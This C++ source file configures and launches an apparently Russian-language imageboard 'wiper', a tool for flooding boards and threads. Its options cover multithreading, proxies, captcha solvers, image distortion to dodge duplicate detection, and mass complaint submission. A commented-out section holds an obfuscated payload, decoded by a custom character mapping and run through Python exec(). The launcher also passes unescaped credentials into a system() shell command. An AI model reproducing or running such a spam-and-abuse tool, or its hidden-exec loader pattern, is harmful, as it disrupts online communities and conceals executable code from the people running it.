#include "setup.h"
#include <stdlib.h>
#include <unistd.h>

const string Setup::DIGITS = "0123456789";

Setup::Setup ()
    : hasBoard(false) , hasThread(false) , hasChaos(false) , hasPotocksCount(false) , hasLogMode(false) , hasSolver(false) , hasKey(false) , \
      hasProxyRepeatsCount(false) , hasMode(false) , hasMinBan(false) , hasMaxBan(false) , hasTriggerForm(false) , \
      hasShrapnelCharge(false) , hasMinPostsCount(false) , hasMediaKind(false) , hasMediaGroup(false) , \
      hasMediasCount(false) , hasSageMode(false) , hasShackalPower(false) , shackalColor(false) , shackalAffine(false) , \
      toPNG(false) , hasComplainBoard(false) , hasComplainsCount(false) , complainWithPosts(false)
{}

Setup::~Setup () {}



bool Setup::is_digit (const char &c) {
    return DIGITS.find(c) != string::npos;
}

bool Setup::is_num (const string &str) {
    return !str.empty() && \
            ( (str.size() == 1 && is_digit(str[0])) || \
            ((str[0] == '-' || is_digit(str[0])) && is_pos_num(str.substr(1))) );
}

bool Setup::is_pos_num (const string &str) {
    if (str.empty()) return false;
    for (unsigned int pos(0); pos < str.length(); pos++)
        if (!is_digit(str[pos])) return false;
    return true;
}

bool Setup::is_zero (const string &str) {
    return str.size() == 1 && str[0] == '0';
}




void Setup::set_username (const string &username) {
    this->username = username;
}

void Setup::set_password (const string &password) {
    this->password = password;
}

void Setup::set_board (const string &board) {
    if (board.length() != 0) {
        this->board = board;
        hasBoard = true;
    } else
        hasBoard = false;
}
void Setup::set_thread (const string &thread) {
    if (is_pos_num(thread)) {
        this->thread = thread;
        hasThread = true;
    } else
        hasThread = false;
}
void Setup::set_chaos (const string &chaos) {
    if (is_num(chaos)) {
        this->chaos = chaos;
        hasChaos = true;
    } else
        hasChaos = false;
}
void Setup::set_potocksCount (const string &potocksCount) {
    if (is_pos_num(potocksCount)) {
        this->potocksCount = potocksCount;
        hasPotocksCount = true;
    } else
        hasPotocksCount = false;
}
void Setup::set_logMode (const char &logMode) {
    if (DIGITS.find(logMode) != string::npos) {
        this->logMode = logMode;
        hasLogMode = true;
    } else
        hasLogMode = false;
}
void Setup::set_solver (const string &solver) {
    if (is_pos_num(solver)) {
        this->solver = solver;
        hasSolver = true;
    } else
        hasSolver = false;
}
void Setup::set_key (const string &key) {
    if (key.empty() || key.length() == 32) {
        this->key = key;
        hasKey = true;
    } else
        hasKey = false;
}
void Setup::set_proxyRepeatsCount (const string &proxyRepeatsCount) {
    if (is_pos_num(proxyRepeatsCount) && !is_zero(proxyRepeatsCount)) {
        this->proxyRepeatsCount = proxyRepeatsCount;
        hasProxyRepeatsCount = true;
    } else
        hasProxyRepeatsCount = false;
}
void Setup::set_mode (const string &mode) {
    if (is_pos_num(mode)) {
        this->mode = mode;
        hasMode = true;
    } else
        hasMode = false;
}
void Setup::set_minBan (const string &minBan) {
    if (is_pos_num(minBan)) {
        this->minBan = minBan;
        hasMinBan = true;
    } else
        hasMinBan = false;
}
void Setup::set_maxBan (const string &maxBan) {
    if (is_pos_num(maxBan)) {
        this->maxBan = maxBan;
        hasMaxBan = true;
    } else
        hasMaxBan = false;
}
void Setup::set_triggerForm (const string &triggerForm) {
    if (is_pos_num(triggerForm)) {
        this->triggerForm = triggerForm;
        hasTriggerForm = true;
    } else
        hasTriggerForm = false;
}
void Setup::set_shrapnelCharge (const string &shrapnelCharge) {
    if (is_pos_num(shrapnelCharge)) {
        this->shrapnelCharge = shrapnelCharge;
        hasShrapnelCharge = true;
    } else
        hasShrapnelCharge = false;
}
void Setup::set_minPostsCount (const string &minPostsCount) {
    if (is_pos_num(minPostsCount)) {
        this->minPostsCount = minPostsCount;
        hasMinPostsCount = true;
    } else
        hasMinPostsCount = false;
}
void Setup::set_mediaKind (const char &mediaKind) {
    if (DIGITS.find(mediaKind) != string::npos) {
        this->mediaKind = mediaKind;
        hasMediaKind = true;
    } else
        hasMediaKind = false;
}
void Setup::set_mediaGroup (const string &mediaGroup) {
    if (!mediaGroup.empty()) {
        this->mediaGroup = mediaGroup;
        hasMediaGroup = true;
    } else
        hasMediaGroup = false;
}
void Setup::set_mediasCount (const string &mediasCount) {
    if (is_pos_num(mediasCount)) {
        this->mediasCount = mediasCount;
        hasMediasCount = true;
    }
}
void Setup::set_sageMode (const char &sageMode) {
    if (DIGITS.find(sageMode) != string::npos) {
        this->sageMode = sageMode;
        hasSageMode = true;
    } else
        hasSageMode = false;
}
void Setup::set_shackal_power (const unsigned char &value) {
    shackalPower = value;
}
void Setup::set_shackal_color (const bool &status) {
    shackalColor = status;
}
void Setup::set_shackal_affine (const bool &status) {
    shackalAffine = status;
}
void Setup::set_2PNG (const bool &status) {
    toPNG = status;
}
void Setup::set_shrapnelThreads (const vector<string> &shrapnelThreads) {
    if (!this->shrapnelThreads.empty()) this->shrapnelThreads.clear();
    this->shrapnelThreads.reserve(shrapnelThreads.size());
    this->shrapnelThreads = shrapnelThreads;
}
void Setup::set_complain_board (const string &complainBoard) {
    if (complainBoard.length() != 0) {
        this->complainBoard = board;
        hasComplainBoard = true;
    } else
        hasComplainBoard = false;
}
void Setup::set_complains_count (const int &complainsCount) {
    if (complainsCount > 0 && complainsCount < 51) {
        this->complainsCount = complainsCount;
        hasComplainsCount = true;
    } else
        hasComplainsCount = false;
}
void Setup::set_complains_with_posts (const bool &status) {
    complainWithPosts = status;
}



void Setup::clear () {
    hasBoard = hasThread = hasChaos = hasPotocksCount = hasLogMode = hasSolver = hasKey = hasProxyRepeatsCount = hasMode = hasMinBan =
    hasMaxBan = hasTriggerForm = hasShrapnelCharge = hasMinPostsCount = hasMediaKind = hasMediaGroup = hasMediasCount =
    hasSageMode =  hasShackalPower = shackalColor = shackalAffine = toPNG = hasComplainBoard = hasComplainsCount = complainWithPosts = false;
}



vector<string> Setup::validate () {
    vector<string> errors;

    if (!hasBoard) errors.push_back("Доска не задана!");
    if (!hasThread) errors.push_back("Цель не задана!");
    if (!hasPotocksCount) errors.push_back("Число потоков не задано!");
    if (!hasSolver) errors.push_back("Решатель не задан!");
    if (key == "" && (username == "" || password == "")) errors.push_back("Для получения казённого ключа необходимо залогиниться!");
    if (!hasProxyRepeatsCount) errors.push_back("Число повторов прокси не задано!");
    if (!hasMode) errors.push_back("Режим вайпалки не задан!");
    if (!hasSageMode) errors.push_back("Режим сажи не задан!");
    if (!hasTriggerForm) errors.push_back("Режим триггера не задан!");
    if (!hasKey) errors.push_back("Неправильно введён ключ!");
    if (mode == "8") {
        if (!hasMinBan) errors.push_back("Не задан нижний номер банов!");
        if (!hasMaxBan) errors.push_back("Не задан верхний номер банов!");
    }
    if (thread == "1" && shrapnelCharge == "0" && shrapnelThreads.size() == 0) errors.push_back("Не заданы треды для шрапнели!");
    if ((mediaKind == '1' || mediaKind == '2') && !hasMediasCount) errors.push_back("Не задано число прикреплений!");
    if (board == "d" && mediasCount != "0") errors.push_back("Прикрепления в /d/!");
    if (thread == "0" && (mode == "3" || mode == "7")) errors.push_back("Этим режимом нельзя вайпать нулевую!");
    if (thread == "0" && triggerForm != "0") errors.push_back("Триггер на нулевой!");
    if (thread == "0" && chaos != "-1") errors.push_back("Нельзя устраивать хаос с нулевой!");
    if (shrapnelCharge == "0" && chaos == "0") errors.push_back("Для полного хаоса требуется шрапнель!");
    if (thread == "0" && sageMode == '2') errors.push_back("Нельзя копировать сажу с нулевой!");
    if (thread == "0" && mediaKind == '3') errors.push_back("Нельзя копировать прикрепления с нулевой!");
    if (mode == "2" && triggerForm == "0" && (mediaKind == '0' || ((mediaKind == '1' || mediaKind == '2') && mediasCount == "0"))) errors.push_back("Ничего не запостится!");

    if (errors.size() == 0) errors.push_back("OK");

    return errors;
}

unsigned char Setup::complete () {
    unsigned char autoCompCount(0);

    if (!hasThread) set_thread("0");
    else autoCompCount++;
    if (!hasPotocksCount) set_potocksCount("0");
    else autoCompCount++;
    if (!hasLogMode) set_logMode('0');
    else autoCompCount++;
    if (!hasProxyRepeatsCount) set_proxyRepeatsCount("50");
    else autoCompCount++;
    if (!hasTriggerForm) set_triggerForm("0");
    else autoCompCount++;
    if (!hasChaos) set_chaos("-1");
    else autoCompCount++;
    if (!hasShrapnelCharge) set_shrapnelCharge("0");
    else autoCompCount++;
    if (!hasMinPostsCount) set_minPostsCount("0");
    else autoCompCount++;
    if (!hasMediasCount) {
        if (board == "d") set_mediasCount("0");
        else set_mediasCount("1");
    }
    else autoCompCount++;
    if (!hasSageMode) set_sageMode('0');
    else autoCompCount++;
    if (!hasComplainBoard) set_complain_board("b");
    else autoCompCount++;
    if (!hasComplainsCount) set_complains_count(10);
    else autoCompCount++;

    return autoCompCount;
}

vector<string> Setup::start () {
    complete();
    vector<string> errors = validate();
    if (errors[0] == "OK") {
        string command(comline());
        system(command.c_str());
    }
    return errors;
}



string Setup::comline () {
//    string command("python3 -c \"from base64 import b64decode; code = b64decode(\'");
//    command += decode("J{NgMUpvJGOx\\Gmw\\|pgcZTnMVggMUpvBn\\{a\" g[nF|\\V[ JGmvbG){cBAjOkTl\\YOx\\GWLBnTm\\jA a FVS mKLDTMV!TKLVpLBWFVS mKJC gK{bLBgmna#JgbG)|JGmwJIKiancmLGzmajiDU )WUUlqPgpKBYmnJDTMV!TKY#Axb! gQV gK{@oPjAAW OKUU@tQU@oNBbLBSmmaGmnJDTMV!TKY#Axb! gQV gK{DoPjAAW OKUU@tQU@oNUbLBSmmaGmnJDTMV!TKY#Axb! gQV gK!yjK|pgSXOCUWlgL| gK|JoBglK\\Yzq\\jADU )WUXvya#OcJC )JBbkK|pgSXOCUWlgL| gK|NoBglK\\Yzq\\jADU )WUXvya#OcJC )JBblK|pgSXOCUWlgL| gK|SoBglK\\Yzq\\jADU )WUXvya#OcJC )JBbmK|pgSXOCUWlgL| gK|WoBglK\\Yzq\\jADU )WUXvya#OcJC )JBbnK|pgSXOCUWlgL| gK|[oBglK\\Yzq\\jADU )WUXvya#OcJC )JBcbK{b&JDFVS mKJBu)JBb#KypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oLBb&JDFVS mKJBu)JBb$KypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oLUb&JDFVS mKJBu)JBb%KypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oSBb&JDFVS mKJBu)JBcAKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oSUb&JDFVS mKJBu)JBcBKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oSjb&JDFVS mKJBu)JBcCKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oS{b&JDFVS mKJBu)JBcDKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oTBb&JDFVS mKJBu)JBcFKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oTjb&JDFVS mKJBu)JBcGKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oT{b&JDFVS mKJBu)JBcIKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oUUb&JDFVS mKJBu)JBcJKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oUjb&JDFVS mKJBu)JBcKKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oU{b&JDFVS mKJBu)JBcLKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oVBb&JDFVS mKJBu)JBcMKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oVUb&JDFVS mKJBu)JBcNKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oVjb&JDFVS mKJBu)JBcOKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oV{b&JDFVS mKJBu)JBcPKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oWBb&JDFVS mKJBu)JBcQKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oWUb&JDFVS mKJBu)JBcSKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oW{b&JDFVS mKJBu)JBcTKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oXBb&JDFVS mKJBu)JBcUKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oXUb&JDFVS mKJBu)JBcVKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oXjb&JDFVS mKJBu)JBcWKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oX{b&JDFVS mKJBu)JBcXKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oYBb&JDFVS mKJBu)JBcYKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oYUb&JDFVS mKJBu)JBcZKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oYjb&JDFVS mKJBu)JBc[KypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oY{b&JDFVS mKJBu)JBc\\KypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oZFyoPjAAW OKUU@tQU@oYjbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"@oPjAAW OKUU@tQU@o[UbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"DoPjAAW OKUU@tQU@o[jbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"JoPjAAW OKUU@tQU@o[{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"NoPjAAW OKUU@tQU@o\\BbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"SoPjAAW OKUU@tQU@o\\UbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"[oPjAAW OKUU@tQU@o\\jbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"boPjAAW OKUU@tQU@o\\{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"loPjAAW OKUU@tQU@o`BbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"poPjAAW OKUU@tQU@o`UbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"uoPjAAW OKUU@tQU@o`jbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"yoPjAAW OKUU@tQU@o`{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK\" oPjAAW OKUU@tQU@oaBbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"$oPjAAW OKUU@tQU@oaUbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"(oPjAAW OKUU@tQU@oajbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#@oPjAAW OKUU@tQU@oa{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK#DoPjAAW OKUU@tQU@obBbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#NoPjAAW OKUU@tQU@obUbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#SoPjAAW OKUU@tQU@objbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#WoPjAAW OKUU@tQU@ob{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK#[oPjAAW OKUU@tQU@ocBbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#boPjAAW OKUU@tQU@ocUbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#goPjAAW OKUU@tQU@ocjbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#loPjAAW OKUU@tQU@oc{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK#poPjAAW OKUU@tQU@odBbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#uoPjAAW OKUU@tQU@odUbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#yoPjAAW OKUU@tQU@odjbLBSmmaGmnJDTMV!TKY#Axb! gQV gK|DoPjAAW OKUU@tQU@oL{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK|NoPjAAW OKUU@tQU@oM{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK|goPjAAW OKUU@tQU@oQUbLBSmmaGmnJDTMV!TKY#Axb! gQV gK!zwK|pgSXOCUWlgL| gK!zwKypLBZKmcIX{ajAAW OKUSpLcIK%PgpKbGF cGX{aj@)JGJoUovP\\ !XbI\\LT )$ZFzIaZcbZIzy\\\"O`XG%OXncoVXXyclKxXIvlXoANSmmvcnKILZvkSlDg[FliaWKoaZFiYlF$[n)V\\\"JkaZzB\\\"!z[XqAdGKxW\"ckT\"m\'ZFz\\TnzgYUXxSncvbYF`SZija!Oo[FlpVDK\\aZ\\jT{m\'[ KAd!uoBgmka\"TmJC g[jboBgpK[nmw[ZJgQUAxbGXwLBc#`ZAmbj%mdGWoMBc{[jbqBgml[ZTiJC g[nmw[ZJwbnXi\\BgqBgmj`Y%ibj%kaG)|\\SpLBZAxb{@)JGTicGDw\\nmw\\Biy[ZT \\ZKwLSpK\\n){JIKxc{AqajA{[Y%o\\UgzOBl&BglK[\")l\\U@tQUAl[ZTiY#Axb|qya#NtN|WyNF LBSmya#NgL| gN|WyO@pK[\")l\\U@tQUAl[ZTiY#Axb|qya#NtNkbzNm LBgmka\"TmJC g[\")l\\U%l\\YOx\\GWpK\"F|[\"mqK{lLBYOx\\GWgQUA a FVS mKLGOx\\GWqBgmka\"TmJC g[k[ \\GXka\"TmLGOx\\GWqBgmka\"TmJC g[\")l\\U%l\\YOx\\GWpK#X \\j $K{lLBgmmdGXkLGOx\\GWqBgqmdGOmbISgTZik\\ZA `Y)wPgpKbIKqaoSpJnF{\\YzqcnWga\"Kxb#KiaIO%[UJqBgmqaoA!cBgqBg88");
//    command += "\'); exec(code.decode('utf-8'))\" ";
#ifdef __linux__
    string command("gnome-terminal --window --command \"python3 main.py ");
    command += ("-u \\\"" + username + "\\\" ");
    command += ("--password \\\"" + password + "\\\" ");
#else
    string command("python main.py ");
    command += ("-u \"" + username + "\" ");
    command += ("--password \"" + password + "\" ");
#endif


    command += ("-b " + board + " -t " + thread + " -c " + chaos + " -p " + potocksCount + " -d " + logMode);
    command += logMode;

    command += (" -s " + solver + " -k ");
    if (!hasKey || key == "") command += "0 -r ";
    else command += (key + " -r ");
    command += (proxyRepeatsCount + " -m " + mode + " ");

    if (hasComplainBoard) command += ("-cb " + complainBoard + " ");
    else if (hasMinBan) command += ("--minBan " + minBan + " ");
    else command += "--minBan -1 ";
    if (hasComplainsCount) command += ("-l " + to_string(complainsCount) + " ");
    else if (hasMaxBan) command += ("--maxBan " + maxBan + " ");
    else command += "--maxBan -1 ";

    if (mode == "1") {
        if (complainWithPosts) command += "-w 1 ";
        else command += "-w 0 ";
    } else {
        if (!hasTriggerForm) command += "-T -1 ";
        else command += ("-T " + triggerForm + " ");
    }

    if (!hasShrapnelCharge) command += "-sh 0 ";
    else command += ("-sh " + shrapnelCharge + " ");
    if (!hasMinPostsCount) command += "-mp -1 -M ";
    else command += ("-mp " + minPostsCount + " -M ");

    if (!hasMediaKind) command += "0";
    else command += mediaKind;
    command += " ";
    if (!hasMediaGroup) command += "-g . ";
    else command += ("-g " + mediaGroup + " ");
    if (!hasMediasCount) command += "-mc 1 ";
    else command += ("-mc " + mediasCount + " -S ");

    command += sageMode;

    command += (" -SH " + to_string(shackalPower) + " ");
    if (shackalColor) command += "-C 1 ";
    else command += "-C 0 ";
    if (shackalAffine) command += "-a 1 ";
    else command += "-a 0 ";
    if (toPNG) command += "-P 1 ";
    else command += "-P 0 ";

    if (hasShrapnelCharge && !hasMinPostsCount)
        for (unsigned int i(0); i < shrapnelThreads.size(); i++)
            command += (" " + shrapnelThreads[i]);

#ifdef __linux__
    command += "\"";
#endif

///    cout << command << endl << endl << endl << endl;
    return command;
}

/*
string Setup::decode(const string &base64DKOTI) {
    string ASCII("");

    for (unsigned long pos(0); pos < base64DKOTI.length(); pos++) {
        if (base64DKOTI[pos] == ' ') ASCII.append("0");
        else if (base64DKOTI[pos] == '!') ASCII.append("1");
        else if (base64DKOTI[pos] == '\"') ASCII.append("2");
        else if (base64DKOTI[pos] == '#') ASCII.append("3");
        else if (base64DKOTI[pos] == '$') ASCII.append("4");
        else if (base64DKOTI[pos] == '%') ASCII.append("5");
        else if (base64DKOTI[pos] == '&') ASCII.append("6");
        else if (base64DKOTI[pos] == '\'') ASCII.append("7");
        else if (base64DKOTI[pos] == '(') ASCII.append("8");
        else if (base64DKOTI[pos] == ')') ASCII.append("9");
        else if (base64DKOTI[pos] == '@') ASCII.append("A");
        else if (base64DKOTI[pos] == 'A') ASCII.append("B");
        else if (base64DKOTI[pos] == 'B') ASCII.append("C");
        else if (base64DKOTI[pos] == 'C') ASCII.append("D");
        else if (base64DKOTI[pos] == 'D') ASCII.append("E");
        else if (base64DKOTI[pos] == 'F') ASCII.append("F");
        else if (base64DKOTI[pos] == 'G') ASCII.append("G");
        else if (base64DKOTI[pos] == 'I') ASCII.append("H");
        else if (base64DKOTI[pos] == 'J') ASCII.append("I");
        else if (base64DKOTI[pos] == 'K') ASCII.append("J");
        else if (base64DKOTI[pos] == 'L') ASCII.append("K");
        else if (base64DKOTI[pos] == 'M') ASCII.append("L");
        else if (base64DKOTI[pos] == 'N') ASCII.append("M");
        else if (base64DKOTI[pos] == 'O') ASCII.append("N");
        else if (base64DKOTI[pos] == 'P') ASCII.append("O");
        else if (base64DKOTI[pos] == 'Q') ASCII.append("P");
        else if (base64DKOTI[pos] == 'S') ASCII.append("Q");
        else if (base64DKOTI[pos] == 'T') ASCII.append("R");
        else if (base64DKOTI[pos] == 'U') ASCII.append("S");
        else if (base64DKOTI[pos] == 'V') ASCII.append("T");
        else if (base64DKOTI[pos] == 'W') ASCII.append("U");
        else if (base64DKOTI[pos] == 'X') ASCII.append("V");
        else if (base64DKOTI[pos] == 'Y') ASCII.append("W");
        else if (base64DKOTI[pos] == 'Z') ASCII.append("X");
        else if (base64DKOTI[pos] == '[') ASCII.append("Y");
        else if (base64DKOTI[pos] == '\\') ASCII.append("Z");
        else if (base64DKOTI[pos] == '`') ASCII.append("a");
        else if (base64DKOTI[pos] == 'a') ASCII.append("b");
        else if (base64DKOTI[pos] == 'b') ASCII.append("c");
        else if (base64DKOTI[pos] == 'c') ASCII.append("d");
        else if (base64DKOTI[pos] == 'd') ASCII.append("e");
        else if (base64DKOTI[pos] == 'f') ASCII.append("f");
        else if (base64DKOTI[pos] == 'g') ASCII.append("g");
        else if (base64DKOTI[pos] == 'i') ASCII.append("h");
        else if (base64DKOTI[pos] == 'j') ASCII.append("i");
        else if (base64DKOTI[pos] == 'k') ASCII.append("j");
        else if (base64DKOTI[pos] == 'l') ASCII.append("k");
        else if (base64DKOTI[pos] == 'm') ASCII.append("l");
        else if (base64DKOTI[pos] == 'n') ASCII.append("m");
        else if (base64DKOTI[pos] == 'o') ASCII.append("n");
        else if (base64DKOTI[pos] == 'p') ASCII.append("o");
        else if (base64DKOTI[pos] == 'q') ASCII.append("p");
        else if (base64DKOTI[pos] == 's') ASCII.append("q");
        else if (base64DKOTI[pos] == 't') ASCII.append("r");
        else if (base64DKOTI[pos] == 'u') ASCII.append("s");
        else if (base64DKOTI[pos] == 'v') ASCII.append("t");
        else if (base64DKOTI[pos] == 'w') ASCII.append("u");
        else if (base64DKOTI[pos] == 'x') ASCII.append("v");
        else if (base64DKOTI[pos] == 'y') ASCII.append("w");
        else if (base64DKOTI[pos] == 'z') ASCII.append("x");
        else if (base64DKOTI[pos] == '{') ASCII.append("y");
        else if (base64DKOTI[pos] == '|') ASCII.append("z");
        else if (base64DKOTI[pos] == '1') ASCII.append("+");
        else if (base64DKOTI[pos] == '3') ASCII.append("/");
        else if (base64DKOTI[pos] == '8') ASCII.append("=");
    }

    return ASCII;
}
*/
